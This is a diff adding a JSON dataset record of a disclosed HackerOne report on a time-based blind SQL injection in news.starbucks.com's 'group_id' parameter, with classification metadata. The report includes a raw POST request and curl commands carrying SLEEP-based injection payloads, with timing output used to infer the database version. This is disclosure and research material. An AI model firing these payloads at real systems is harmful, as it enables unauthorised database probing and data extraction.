@@ -1,0 +1,42 @@
+{
+    "reported_to": "Starbucks",
+    "reported_by": "toctou ",
+    "title": "Time-based Blind SQLi on news.starbucks.com",
+    "content": "\nHi,\nI just found that the post parameter \"group_id\" for a particularly crafted http request is being vulnerable to injection due to missing parameter sanitization.\nPoC:\nCode 267 Bytes\n1POST / HTTP/1.1\n2Host: news.starbucks.com\n3Connection: close\n4Content-Length: 81\n5Cache-Control: max-age=0\n6Origin: https://news.starbucks.com\n7Content-Type: application/x-www-form-urlencoded\n8\n9ACT=55&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(1=1,SLEEP(1),0) AND group_id='1\nThis query will result in an execution of a SLEEP command, delaying the server response time:\nCode 169 Bytes\n1time curl --data \"ACT=55&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(1=1,SLEEP(1),0) AND group_id='1\" https://news.starbucks.com\n2\n3real\t0m4.945s\n4user\t0m0.000s\n5sys\t\t0m0.063s\nIf the custom IF statement evaluates to False, the response would be sensibly faster:\nCode 169 Bytes\n1time curl --data \"ACT=55&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(1=2,SLEEP(1),0) AND group_id='1\" https://news.starbucks.com\n2\n3real\t0m0.860s\n4user\t0m0.000s\n5sys\t\t0m0.031s\nIn this way it was possible to detect the dbms version being 5:\nCode 322 Bytes\n1time curl --data \"ACT=55&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(MID(VERSION(),1,1)='5',SLEEP(1),0) AND group_id='1\" https://news.starbucks.com\n2\n3real\t0m4.945s\n4\n5time curl --data \"ACT=55&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(MID(VERSION(),1,1)='4',SLEEP(1),0) AND group_id='1\" https://news.starbucks.com\n6\n7real\t0m1.005s\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "SQL Injection"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1487983620,
+    "report_url": "https://hackerone.com/reports/198292",
+    "is_multi_component": false,
+    "complexity": "LOW",
+    "novelty": "LOW",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Send a crafted HTTP POST request to news.starbucks.com with the 'group_id' parameter containing a SQL injection payload that includes a conditional SLEEP command."
+        ],
+        [
+            2,
+            "Observe the response time to determine if the injection was successful (delayed response indicates successful injection)."
+        ]
+    ],
+    "vuln_description": "The vulnerability is a time-based blind SQL injection in the 'group_id' parameter of a POST request to news.starbucks.com. The lack of proper input sanitization allows an attacker to inject SQL commands that can conditionally delay the server's response, enabling information disclosure about the database.",
+    "reason": "The attack involves a straightforward SQL injection technique with a time-based component. While it requires knowledge of SQL injection and the use of time delays, the attack does not involve multiple components, complex application states, or novel logic. The interaction between the components is direct and well-understood in the security community.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null,
+    "authnz_metadata": {
+        "reason": "The SQL injection vulnerability involves manipulating the 'group_id' parameter to execute time-based blind SQL queries, which is a different class of vulnerability (injection) than the authN/authZ bypass or IDOR vulnerabilities described in the methodology. The methodology focuses on testing authorization boundaries by swapping user sessions and resource IDs, not on parameter manipulation for SQL injection.",
+        "is_detectable": false
+    }
+}
